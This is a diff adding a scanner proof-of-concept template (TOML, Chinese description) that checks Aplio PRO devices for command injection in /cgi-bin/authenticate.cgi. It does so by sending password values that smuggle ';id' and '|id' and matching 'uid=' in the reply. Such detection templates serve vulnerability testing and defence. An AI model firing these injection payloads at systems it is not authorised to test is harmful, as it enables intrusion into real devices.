@@ -1,0 +1,51 @@
+[info]
+author = "AVE"
+description = "向 Aplio PRO 设备的 /cgi-bin/authenticate.cgi 发送包含 shell 元字符的 password 参数，验证是否存在命令注入漏洞。若返回中包含命令执行结果（如 id 命令输出），则判定存在漏洞。"
+id = "POC-AVE-2000-1014"
+name = "Aplio PRO authenticate.cgi 远程命令执行 PoC"
+severity = "high"
+tags = ["ave-2000-1014"]
+vuln_id = [
+    "CVE-2000-0923",
+    "AVE-2000-1014",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/authenticate.cgi?password=%3Bid"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/authenticate.cgi?password=%7Cid"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "password=%3Bid"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
